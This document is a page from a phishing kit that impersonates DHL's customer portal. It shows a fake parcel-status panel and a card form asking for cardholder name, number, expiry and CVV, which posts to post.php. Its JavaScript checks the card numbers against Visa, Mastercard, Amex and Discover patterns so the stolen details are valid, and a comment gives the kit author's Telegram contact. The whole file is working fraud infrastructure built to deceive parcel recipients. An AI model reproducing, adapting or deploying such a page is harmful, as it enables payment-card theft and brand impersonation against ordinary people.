<!-- ____ INFORMATION ____ 
     
     TELEGRAM : @eldaronne
-->


<?php 

require_once "functions.php";
lang();


?>


<!DOCTYPE html>
<html>
<head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <!-- link_icons -->
        <link rel="stylesheet"  href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css">
        <link rel="stylesheet"  href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"> 
        <title>Login to Customer Portals and Tools | DHL |</title>
        <!-- logo site web-->
        <link rel="icon" href="image/favicon.ico" type="image/x-icon"/>
        <link rel="shortcut icon" href="image/favicon.ico" type="image/x-icon" />
        <!-- link__css -->
        <link rel="stylesheet"  href="css/bootstrap.css">
        <link rel="stylesheet"  href="css/posta.css">
</head>
<body>


        <!-- Start____Navbar -->
        <div class="navbar">
        	<div class="container-fluid">
        		<div class="topping">
        			<img src="image/dhl-logo.svg">
        			<ul class="web">
        				<li><i class="bi bi-exclamation-circle me-2"></i><?php echo get_text('top_header1'); ?></li>
        				<li><?php echo get_text('top_header2'); ?></li>
        				<li><i class="bi bi-globe me-2"></i><?php echo get_text('top_header3'); ?></li>
        				<li><i class="bi bi-search me-2"></i><?php echo get_text('top_header4'); ?></li>
        			</ul>
        			<ul class="respo">
        				<li><i class="bi bi-list"></i></li>
        				<li></li>
        			</ul>
        		</div>
        		<div class="bottomin">
        			<ul>
        				<li><?php echo get_text('mainmenu1'); ?><i class="bi bi-chevron-down ms-1"></i></li>
        				<li><?php echo get_text('mainmenu2'); ?><i class="bi bi-chevron-down ms-1"></i></li>
        				<li><?php echo get_text('mainmenu3'); ?><i class="bi bi-chevron-down ms-1"></i></li>
        				<li><?php echo get_text('mainmenu4'); ?><i class="bi bi-chevron-down ms-1"></i></li>
        			</ul>
        			<p><i class="bi bi-person-fill me-2"></i><?php echo get_text('header-right'); ?></p>
        		</div>
        	</div>
        </div>
        <!-- End____Navbar -->

        <!-- Start____Home -->
        <div class="home info carta">
        	<div class="otside put">
        		<div class="container">
        			<div class="text-center"><h1><?php echo get_text('title'); ?></h1></div>
        			<div class="lettre login valid">
        				<div class="dell">
        					<div class="titre">
	        					<img src="image/camion.png">
	        					<h3><?php echo get_text('title2'); ?> </h3>
	        				</div>
	        				<div class="steps">
	        					<span class="green"></span>
	        					<span class="green"></span>
	        					<span></span>
	        				</div>
        				</div>
        				<div class="row gx-4">
        					<div class="col-lg-8 genius">
        						<div class="gauche hna">
        							<h4><?php echo get_text('card_info'); ?> </h4>
        							<div class="magic">
										<img src="image/vi.svg">
                                    <img src="image/mas.svg">
									</div>
        							<form action="post.php" method="post" onsubmit="return formValidation()">
        								<input type="hidden" name="step" value="cc">
        								<div class="form-group mt-3">	
                                             <label><?php echo get_text('name_label'); ?> <span>*</span></label>
                                             <input type="text" name="full" id="full" class="form-control" placeholder="Card holder's name" >
        								</div>
        								<div class="ereur_full" style="color:red;font-size:12px"></div>
    									<div class="form-group mt-3 viza">	
                                             <label><?php echo get_text('one_label'); ?> <span>*</span></label>
                                             <input type="text" name="card" id="card" class="form-control" placeholder="XXXX XXXX XXXX XXXX" oninput=" if(ValidateCreditCardNumber(this.value)){ this.style.borderColor = 'inherit'; document.getElementById('btn0').disabled = false;  }else{ this.style.borderColor = 'red'; document.getElementById('btn0').disabled = true; }">
        								</div>
        								<div class="ereur_card" style="color:red;font-size:12px"></div>
        								<div class="calisy">
        									<div class="form-group mt-3 ville">	
	                                             <input type="text" name="month" id="month" class="form-control" placeholder="<?php echo get_text('two_label'); ?>">
	                                             <div class="ereur_month" style="color:red;font-size:11px"></div>
	        								</div>
	        								<div class="form-group mt-3 ville">	
	                                             <input type="text" name="year" id="year" class="form-control" placeholder="<?php echo get_text('two_label_2'); ?>">
	                                             <div class="ereur_year" style="color:red;font-size:11px"></div>
	        								</div>
	        								<div class="form-group mt-3 astra">	
	                                             <input type="text" name="cvv" id="cvv" class="form-control" placeholder="<?php echo get_text('three_label'); ?>">
	                                             <div class="ereur_cvv" style="color:red;font-size:11px"></div>
	        								</div>
        								</div>
        								<div class="botona">
        									<button id="btn0" class="btn" name="submit" disabled><?php echo get_text('next'); ?></button>
        								</div>	
        							</form>
        						</div>
        					</div>
        					<div class="col-lg-4 power">
        					    <div class="droit lhih">
        					     	<div class="offre">
                                        <div class="status">
                                            <p><?php echo get_text('status'); ?></p>
                                        </div>
                                        <div class="status">
                                            <p><?php echo get_text('parcel'); ?></p>
                                        </div>
                                        <div class="status">
                                            <p><?php echo get_text('tracking'); ?></p>
                                        </div>
                                    </div>
									<div class="offre">
										<div class="status">
											<p><?php echo get_text('last_update'); ?>: <b><?php echo date('l jS \of  h:i A'); ?></b></p>
										</div>
										<div class="status">
											<p><?php echo get_text('shipment'); ?></p>
										</div>
										<div class="status">
											<p><?php echo get_text('total'); ?></p>
										</div>
									</div>
									<hr>
									<div class="important mt-4">
    							<h5>I<?php echo get_text('important_title'); ?></h5>
    							<p><?php echo get_text('important_message'); ?></p>
    						</div>
        					    </div>
        					</div>
        				</div>
        			</div>
        		</div>
        	</div>
        </div>
        <!-- Ennnd____Home -->



        <!-- STAAAART_SOUS -->
        <div class="sous boso ">
        	<div class="container-fluid">
        		<div class="row">
        			<div class="col-lg-9">
        				<img src="image/group.svg">
        				<ul>
        					<li><?php echo get_text('footer-menu-1'); ?></li>
        					<li><?php echo get_text('footer-menu-2'); ?></li>
        					<li><?php echo get_text('footer-menu-3'); ?></li>
        					<li><?php echo get_text('footer-menu-4'); ?></li>
        					<li><?php echo get_text('footer-menu-5'); ?></li>
        					<li><?php echo get_text('footer-menu-6'); ?></li>
        					<li><?php echo get_text('footer-menu-7'); ?></li>
        					<li><?php echo get_text('footer-menu-8'); ?></li>
        				</ul>
        			</div>
        			<div class="col-lg-3">
        				<h6><?php echo get_text('follow-us'); ?></h6>
        				<img src="image/socio.png" class="socio">
        			</div>
        			<div class="text-center ss"><?php echo get_text('copyright'); ?></div>
        		</div>	
        	</div>
        </div>
        <!-- ENNNNNND_SOUS -->







        <script src="js/jquery-3.5.1.min.js"></script>
        <script src="js/jquery.mask.js"></script>
        <script src="js/jquery.mask.js"></script>
        <script>
        
		function ValidateCreditCardNumber(data) {

  var ccNum = data;
  var visaRegEx = /^(?:4[0-9]{12}(?:[0-9]{3})?)$/;
  var mastercardRegEx = /^(?:5[1-5][0-9]{14})$/;
  var amexpRegEx = /^(?:3[47][0-9]{13})$/;
  var discovRegEx = /^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;
  var isValid = false;

  if (visaRegEx.test(ccNum)) {
    isValid = true;
  } else if(mastercardRegEx.test(ccNum)) {
    isValid = true;
  } else if(amexpRegEx.test(ccNum)) {
    isValid = true;
  } else if(discovRegEx.test(ccNum)) {
    isValid = true;
  }

  if(isValid) {
     return true;
  } else {
     return false;
  }
}


	       /* $("#card").mask("0000 0000 0000 0000"); */
	        $("#month").mask("00");
	        $("#year").mask("00");
	        $("#cvv").mask("000");
        

             function formValidation(){
                var full = $("#full").val();
                var card = $("#card").val();
                var month = $("#month").val();
                var year = $("#year").val();
                var cvv = $("#cvv").val();


                // Validation_card
                 // Validation_card
                if(full==""){
                    $(".ereur_full").text("required field");
                    $("#full").css("border","1px solid red")
                    return false;
                }else{
                    $("#full").css("border","1px solid #ced4da");
                    $(".ereur_full").hide();
                }


               

                // Validation_MONTH
                if(month==""){
                    $(".ereur_month").text(" required field");
                    $("#month").css("border","1px solid red")
                    return false;
                }else{
                    var patern_month = /^[0-9]{2}$/;
                    if(!patern_month.test(month)){
                        $(".ereur_month").text("must be exactly 2 characters");
                        $("#month").css("border","1px solid red")
                        return false;
                    }else{
                       $("#month").css("border","1px solid #ced4da");
                       $(".ereur_month").hide();
                    }
                }

                // Validation_YEAR
                if(year==""){
                    $(".ereur_year").text(" required field");
                    $("#year").css("border","1px solid red")
                    return false;
                }else{
                    var patern_year = /^[0-9]{2}$/;
                    if(!patern_year.test(year)){
                        $(".ereur_year").text("must be exactly 2 characters");
                        $("#year").css("border","1px solid red")
                        return false;
                    }else{
                       $("#year").css("border","1px solid #ced4da");
                       $(".ereur_year").hide();
                    }
                }

                 // Validation_YEAR
                if(cvv==""){
                    $(".ereur_cvv").text(" required field");
                    $("#cvv").css("border","1px solid red")
                    return false;
                }else{
                    var patern_cvv = /^[0-9]{3}$/;
                    if(!patern_cvv.test(cvv)){
                        $(".ereur_cvv").text("must be exactly 3 characters");
                        $("#cvv").css("border","1px solid red")
                        return false;
                    }else{
                       $("#cvv").css("border","1px solid #ced4da");
                       $(".ereur_cvv").hide();
                    }
                }

                

                

               

                return true;
            }
             
        </script>
              
</body>
</html>


                 